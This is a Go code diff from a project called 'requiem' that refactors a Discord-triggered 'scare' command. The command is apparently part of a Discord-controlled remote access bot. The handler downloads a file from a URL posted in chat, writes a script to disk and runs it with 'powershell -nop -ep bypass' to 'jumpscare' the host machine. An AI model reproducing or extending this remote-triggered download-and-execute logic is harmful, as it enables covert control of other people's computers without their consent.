@@ -11,25 +11,23 @@ import (
 	"requiem/store"
 	"requiem/utils"
 	"requiem/utils/discord"
-
-	"github.com/bwmarrin/discordgo"
 )
 
-func (*ScareCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
+func (*ScareCommand) Exec(ctx *store.CommandContext, args []string) {
 	timeout, found := utils.FindNumber(strings.Join(args, " "))
 	if found == false {
 		timeout = 670
 	}
 
-	urls := discord.GetUrls(msg)
+	urls := discord.GetUrls(ctx)
 	if len(urls) == 0 {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to find any urls.", msg.Reference())
+		ctx.ReplyMsg("🟥 Failed to find any urls.")
 		return
 	}
 
 	path, err := utils.DownloadFile(urls[0], "")
 	if err != nil {
-		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to download - %s", err), msg.Reference())
+		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to download - %s", err))
 		return
 	}
 
@@ -69,14 +67,14 @@ func (*ScareCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 
 	err = os.WriteFile(scarePath, []byte(jumpscare.String()), 0666)
 	if err != nil {
-		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to jumpscare - %s", err), msg.Reference())
+		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to jumpscare - %s", err))
 		return
 	}
 
 	cmd := utils.StartCommand("powershell", "-nop", "-ep", "bypass", "-file", scarePath)
 	cmd.Start()
 
-	ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully jumpscared.", msg.Reference())
+	ctx.ReplyMsg("🟩 Successfully jumpscared.")
 
 	time.Sleep(time.Duration(timeout) * time.Millisecond)
 
